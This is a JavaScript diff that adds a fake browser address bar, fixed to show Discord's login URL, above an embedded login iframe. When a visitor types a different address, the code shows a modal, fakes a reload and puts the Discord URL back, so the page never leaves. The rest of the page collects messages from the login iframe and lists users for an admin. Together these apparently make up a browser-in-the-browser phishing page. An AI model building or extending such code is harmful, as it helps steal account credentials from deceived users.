@@ -15,6 +15,12 @@ const adminAccessBtn = document.getElementById('admin-access-btn');
 const tryAgainBtn = document.getElementById('try-again-btn');
 const adminLogoutBtn = document.getElementById('admin-logout-btn');
 
+// URL Bar Elements
+const urlInput = document.getElementById('url-input');
+const urlWarningModal = document.getElementById('url-warning-modal');
+const modalCancelBtn = document.getElementById('modal-cancel-btn');
+const modalContinueBtn = document.getElementById('modal-continue-btn');
+
 // Admin elements
 const generateCodeBtn = document.getElementById('generate-code-btn');
 const generatedCodeDisplay = document.getElementById('generated-code-display');
@@ -27,6 +33,66 @@ const usersTbody = document.getElementById('users-tbody');
 let currentUserEmail = null;
 let isAdmin = false;
 let currentGeneratedCode = '';
+const originalUrl = 'https://discord.com/login';
+
+// URL Bar Logic
+let urlChanged = false;
+
+urlInput.addEventListener('focus', () => {
+    urlInput.select();
+});
+
+urlInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        const newUrl = urlInput.value.trim();
+        
+        if (newUrl !== originalUrl && newUrl !== '') {
+            urlChanged = true;
+            urlWarningModal.classList.remove('hidden');
+        }
+    }
+});
+
+urlInput.addEventListener('blur', () => {
+    const newUrl = urlInput.value.trim();
+    
+    if (newUrl !== originalUrl && newUrl !== '' && !urlChanged) {
+        urlChanged = true;
+        urlWarningModal.classList.remove('hidden');
+    }
+});
+
+// Modal Cancel
+modalCancelBtn.addEventListener('click', () => {
+    urlWarningModal.classList.add('hidden');
+    urlInput.value = originalUrl;
+    urlChanged = false;
+});
+
+// Modal Continue (acts as Google then resets)
+modalContinueBtn.addEventListener('click', () => {
+    urlWarningModal.classList.add('hidden');
+    
+    // Brief flash/loading effect
+    const iframe = document.getElementById('login-iframe');
+    iframe.style.opacity = '0.5';
+    
+    setTimeout(() => {
+        // Reset URL and refresh
+        urlInput.value = originalUrl;
+        urlChanged = false;
+        iframe.src = iframe.src;
+        iframe.style.opacity = '1';
+    }, 500);
+});
+
+// Click backdrop to close modal
+document.querySelector('.modal-backdrop')?.addEventListener('click', () => {
+    urlWarningModal.classList.add('hidden');
+    urlInput.value = originalUrl;
+    urlChanged = false;
+});
 
 // Listen for messages from the login iframe
 window.addEventListener('message', (event) => {
@@ -68,7 +134,6 @@ async function checkAdminStatus(email) {
         
         if (data) {
             const entries = Object.values(data);
-            // Check if any entry has owner: true
             isAdmin = entries.some(entry => entry.owner === true);
         }
     } catch (error) {
